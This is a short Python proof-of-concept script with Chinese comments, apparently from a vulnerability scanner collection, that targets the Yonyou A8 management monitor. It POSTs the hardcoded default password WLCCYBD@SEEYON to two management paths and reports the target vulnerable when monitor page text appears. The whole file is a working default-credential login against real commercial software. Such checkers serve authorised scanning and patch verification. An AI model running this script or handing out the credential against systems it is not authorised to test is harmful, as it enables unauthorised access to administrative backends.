#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友a8监控后台默认密码漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0157458
author: Lucifer
description: 路径seeyon/management/status.jsp存在默认密码WLCCYBD@SEEYON。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['用友a8监控后台默认密码漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {"password":"WLCCYBD@SEEYON"}
        payloads = {"/seeyon/management/index.jsp",
                    "/management/index.jsp"}
        try:
            noexist = True
            for payload in payloads:
                vulnurl = url + payload
                req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
                if r"A8 Management Monitor" in req.text and r"Connections Stack Trace" in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl+"\npost: "+json.dumps(post_data, indent=4)
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
